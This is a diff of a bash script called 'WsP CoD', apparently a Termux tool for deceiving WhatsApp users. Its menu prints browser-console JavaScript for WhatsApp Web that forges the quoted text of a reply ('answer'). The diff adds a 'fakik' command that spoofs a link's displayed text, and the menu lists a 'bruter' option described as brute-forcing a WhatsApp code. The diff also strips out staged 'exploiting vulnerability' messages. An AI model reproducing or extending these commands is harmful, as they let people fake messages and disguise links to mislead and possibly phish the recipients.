@@ -1,7 +1,7 @@
 #!/bin/bash
 banner(){
 clear
-echo -e "\e[32m▄▄▌ ▐ ▄▌.▄▄ ·  ▄▄▄· ▄▄·       ·▄▄▄▄      
+echo -e "\e[1;34m▄▄▌ ▐ ▄▌.▄▄ ·  ▄▄▄· ▄▄·       ·▄▄▄▄      
 ██· █▌▐█▐█ ▀. ▐█ ▄█▐█ ▌▪▪     ██▪ ██     
 ██▪▐█▐▐▌▄▀▀▀█▄ ██▀·██ ▄▄ ▄█▀▄ ▐█· ▐█▌    
 ▐█▌██▐█▌▐█▄▪▐█▐█▪·•▐███▌▐█▌.▐▌██. ██     
@@ -10,11 +10,9 @@ echo -e "\e[32m▄▄▌ ▐ ▄▌.▄▄ ·  ▄▄▄· ▄▄·       ·▄�
 banner
 while :;
 do
-echo -n "wsp> "
+echo -en "wsp> "
 read opc
-c=$(echo "$opc" | awk '{print $1}')
-i=$(echo "$opc" | awk '{print $2}')
-if [[ $c == "bruter" ]];
+if [[ $opc == "bruter" ]];
 then
 if [[ -x $PREFIX/bin/termux-open ]];
 then
@@ -28,62 +26,41 @@ done
 else
 echo -e "WsP CoD:\e[31m termux is required.\e[0m"
 fi
-elif [[ $c == "answer" ]]
+elif [[ $opc == "answer" ]]
 then
-sleep 1
-echo -e "\e[32m[+]\e[0m exploiting vulnerability"
-sleep 1
-echo " |"
-sleep 1
-echo -e " |-\e[32m sucess\e[0m"
-sleep 5
-echo -e "\e[1;34m[+]\e[0m searching for answer page "
-echo -e " |-\e[32m whatsapp.com \e[0m scan.."
-sleep 1
-echo " |"
-sleep 3
-echo -e " |-\e[32m web.whatsapp.com \e[0m granted"
-sleep 1
-echo " |"
-sleep 1
-echo -en "\e[31m[!]\e[0m message to forge "
+echo -en "\e[1;34m[!]\e[0m message to forge\e[1;34m "
 read msg
 sleep 1
-echo " |"
-sleep 1
-echo -e "\e[32m[+]\e[0m command console attack\e[0m "
+echo -e "\e[1;34m[+]\e[0m command console attack\e[0m "
 sleep 2
-echo -e ' |-\e[32m copy and paste to console\e[0m Java Script'
-sleep 3
-for i in $(seq 1 60); do echo -en "_" ; done ; echo -e ""
-echo "
-clear();
-console.log('%c ▄▄▌ ▐ ▄▌.▄▄ ·  ▄▄▄· ▄▄·       ·▄▄▄▄ \n██· █▌▐█▐█ ▀. ▐█ ▄█▐█ ▌▪▪     ██▪ ██ \n██▪▐█▐▐▌▄▀▀▀█▄ ██▀·██ ▄▄ ▄█▀▄ ▐█· ▐█▌\n▐█▌██▐█▌▐█▄▪▐█▐█▪·•▐███▌▐█▌.▐▌██. ██\n ▀▀▀▀ ▀▪ ▀▀▀▀ .▀   ·▀▀▀  ▀█▄▀▪▀▀▀▀▀• ', 'background: #222; color: #bada55');
-console.table('Fake messages to responder on WhatsApp');
-alert('WsP CoD: accept to start ...')
-e.__x_quotedMsg.body = '$msg';
-e.__x_quotedStanzaID = e.__x_quotedStanzaID + '_';
-"
-for i in $(seq 1 60); do echo -en "_" ; done ; echo -e ""
+echo -e "\e[1;34m >\e[0m command \e[1;34m:\e[0m e.__x_quotedMsg.body = '\e[1;34m$msg\e[0m';"
 sleep 1
-python -m webbrowser -n https://web.whatsapp.com/
-elif [[ $c == "help" ]]
+echo -e "\e[1;34m >\e[0m command \e[1;34m:\e[0m e.__x_quotedStanzaID = e.__x_quotedStanzaID + '_';"
+elif [[ $opc == "fakik" ]]
 then
-echo -e "\e[32m\t WsP CoD help \e[0m"
+echo -en "\e[1;34m[!]\e[0m url to forge\e[1;34m "
+read url
+sleep 1
+echo -e "\e[1;34m[+]\e[0m command console attack\e[0m "
+sleep 2
+echo -e "\e[1;34m >\e[0m command \e[1;34m:\e[0m e.__x_body = e.__x_matchedText = '\e[1;34m$url\e[0m'"
+elif [[ $opc == "help" ]]
+then
 echo
-echo -e "bruter \t bruter force code whatsapp"
-echo -e "answer \t false answer message WhatsApp"
-echo -e "banner \t show banner "
-echo -e "exit \t exit wspcod"
+echo -e "\e[1;34mbruter\e[0m \t bruter force code whatsapp"
+echo -e "\e[1;34manswer\e[0m \t false answer message WhatsApp"
+echo -e "\e[1;34mfakik\e[0m \t fake link on WhatsApp"
+echo -e "\e[1;34mbanner\e[0m \t show banner "
+echo -e "\e[1;34mexit\e[0m \t exit wspcod"
 echo
-elif [[ $c == "banner" ]]
+elif [[ $opc == "banner" ]]
 then
 banner
-elif [[ $c == "exit" ]]
+elif [[ $opc == "exit" ]]
 then
 echo -e "\e[31m[exit]\e[0m "
 exit
 else 
-echo -e "WsP CoD:\e[32m help is required\e[0m"
+echo -en ""
 fi
 done
